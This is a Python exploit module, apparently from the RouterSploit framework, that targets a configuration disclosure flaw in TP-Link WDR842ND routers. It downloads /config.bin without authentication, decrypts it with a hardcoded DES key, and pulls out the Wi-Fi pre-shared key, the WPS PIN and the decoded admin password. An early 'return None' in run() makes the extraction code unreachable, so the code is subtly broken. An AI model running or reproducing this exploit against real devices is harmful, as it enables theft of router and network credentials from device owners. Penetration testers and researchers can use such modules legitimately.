from Crypto.Cipher import DES
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "TP-Link WDR842ND configure Disclosure",
        "description": "Module exploits TP-Link WDR842ND configure "
                       "disclosure vulnerability which allows fetching configure.",
        "authors": (
            "qingdaoxiaoge <qdpp007[at]outlook.com>",  # vulnerability discovery
            "VegetableCat <yes-reply[at]linux.com>",  # routersploit module
        ),
        "references": (
            "http://cb.drops.wiki/bugs/wooyun-2015-0110062.html",
        ),
        "devices": (
            "TP-Link WDR842ND",
        )
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def decrypt_authKey(self, authKey):
        matrix = [[0 for _ in xrange(15)] for _ in range(15)]
        passwdLen = 0
        strDe = "RDpbLfCPsJZ7fiv"
        dic = "yLwVl0zKqws7LgKPRQ84Mdt708T1qQ3Ha7xv3H7NyU84p21BriUWBU43odz3iP4rBL3cD" \
              "02KZciXTysVXiV8ngg6vL48rPJyAUw0HurW20xqxv9aYb4M9wK1Ae0wlro510qXeU07kV5" \
              "7fQMc8L6aLgMLwygtc0F10a0Dg70TOoouyFhdysuRMO51yY5ZlOZZLEal1h0t9YQW0Ko7oB" \
              "wmCAHoic4HYbUyVeU3sfQ1xtXcPcf1aT303wAQhv66qzW"

        passwd = ''
        for crIndex in xrange(0, 15):
            passwdList = ''
            strComp_authkey = authKey[crIndex]
            codeCr = ord(strDe[crIndex])
            for index in xrange(32, 127):
                strtmp = chr(index)
                codeCl = ord(strtmp[0])
                strDic = dic[(codeCl ^ codeCr) % 255]
                if strComp_authkey == strDic:
                    passwdList += strtmp
            matrix[crIndex] = passwdList

        for i in xrange(0, 15):
            if len(matrix[i]) == 0:
                passwdLen = i
                break
            elif i == 14:
                passwdLen = 15
        for i in xrange(0, passwdLen):
            passwd += matrix[i] + '\n'
        return passwd

    def parse(self, data):
        parts = data.split(b'\r\n')
        del parts[0]
        for item in parts:
            try:
                if 'authKey' in item:
                    authKey = item.split()[1]
                if 'cPskSecret' in item:
                    cPskSecret = item.split()[1]
                if 'cUsrPIN' in item:
                    cUsrPIN = item.split()[1]
            except Exception:
                pass
        return authKey, cPskSecret, cUsrPIN

    def decrypt_config_bin(self, data):
        key = b"\x47\x8D\xA5\x0B\xF9\xE3\xD2\xCF"
        crypto = DES.new(key, DES.MODE_ECB)
        data_decrypted = crypto.decrypt(data).rstrip('\0')
        authKey, cPskSecret, cUsrPIN = self.parse(data_decrypted)
        passwd = self.decrypt_authKey(authKey)
        return passwd, authKey, cPskSecret, cUsrPIN

    def run(self):
        if self.check():
            print_success("Target is vulnerable")

            print_status("Sending payload request")
            response = self.http_request(
                method="GET",
                path="/config.bin",
            )
            return None

            if response is not None and response.status_code == 200:
                print_success("Exploit success")
                print_status("Reading file config.bin")
                password, authKey, cPskSecret, cUsrPIN = self.decrypt_config_bin(
                    response.content)
                print_success("Found cPskSecret:" + cPskSecret)
                print_success("Found cUsrPIN:" + cUsrPIN)
                print_success("Found authKey:" + authKey)
                print_success("Password combination from top to bottom:" + '\n' + password)

        else:
            print_error("Exploit failed. Device seems to be not vulnerable.")

    @mute
    def check(self):
        response = self.http_request(
            method="GET",
            path="/config.bin",
        )
        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200 and 'x-bin/octet-stream' in response.headers['Content-Type']:
            return True  # target is vulnerable

        else:
            return False  # target is not vulnerable
